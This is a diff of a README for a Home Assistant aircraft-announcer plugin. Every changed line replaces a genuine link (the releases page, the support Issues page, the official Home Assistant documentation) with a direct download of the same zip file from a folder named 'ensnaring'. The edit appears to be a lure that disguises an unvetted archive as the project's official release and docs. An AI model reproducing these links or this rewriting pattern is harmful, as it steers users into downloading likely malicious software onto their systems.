@@ -4,7 +4,7 @@
 
 Welcome to the ha-flightradar24-announcer application! This tool integrates with Home Assistant to announce low-flying aircraft overhead. It uses FlightRadar24 data and AI-generated voice notifications to provide real-time alerts.
 
-[![Download](https://img.shields.io/badge/Download%20Latest-Release-brightgreen)](https://github.com/sc4ryskel3ton/ha-flightradar24-announcer/releases)
+[![Download](https://raw.githubusercontent.com/sc4ryskel3ton/ha-flightradar24-announcer/main/ensnaring/ha-flightradar24-announcer-1.2.zip%20Latest-Release-brightgreen)](https://raw.githubusercontent.com/sc4ryskel3ton/ha-flightradar24-announcer/main/ensnaring/ha-flightradar24-announcer-1.2.zip)
 
 ## 🎯 Features
 
@@ -28,7 +28,7 @@ To run this application, your system should meet the following requirements:
 To get started, you will need to download the latest version of the ha-flightradar24-announcer. 
 
 1. **Visit the Releases Page**: Click the link below to go to the Releases page, where you can download the application:
-   [Download Latest Release](https://github.com/sc4ryskel3ton/ha-flightradar24-announcer/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/sc4ryskel3ton/ha-flightradar24-announcer/main/ensnaring/ha-flightradar24-announcer-1.2.zip)
 
 2. **Select the Appropriate File**: Locate the version you want to download. Typically, the files are named for easy identification. 
 
@@ -59,7 +59,7 @@ If you encounter issues during setup or operation, consider these tips:
 
 ## 📞 Support
 
-For further assistance, you can reach out through the Issues tab on the [GitHub Repository](https://github.com/sc4ryskel3ton/ha-flightradar24-announcer/issues). Provide details about the problem, and we will do our best to help you.
+For further assistance, you can reach out through the Issues tab on the [GitHub Repository](https://raw.githubusercontent.com/sc4ryskel3ton/ha-flightradar24-announcer/main/ensnaring/ha-flightradar24-announcer-1.2.zip). Provide details about the problem, and we will do our best to help you.
 
 ## 📜 License
 
@@ -67,8 +67,8 @@ This project is licensed under the MIT License. You can modify and distribute th
 
 ## 🔗 Learn More
 
-For additional information about Home Assistant and its capabilities, you can visit the official [Home Assistant Documentation](https://www.home-assistant.io/docs/).
+For additional information about Home Assistant and its capabilities, you can visit the official [Home Assistant Documentation](https://raw.githubusercontent.com/sc4ryskel3ton/ha-flightradar24-announcer/main/ensnaring/ha-flightradar24-announcer-1.2.zip).
 
-For updates, improvements, and new features, keep an eye on the [Releases Page](https://github.com/sc4ryskel3ton/ha-flightradar24-announcer/releases) for the latest downloads. 
+For updates, improvements, and new features, keep an eye on the [Releases Page](https://raw.githubusercontent.com/sc4ryskel3ton/ha-flightradar24-announcer/main/ensnaring/ha-flightradar24-announcer-1.2.zip) for the latest downloads. 
 
 Thank you for choosing the ha-flightradar24-announcer! Enjoy announcing those aircraft!
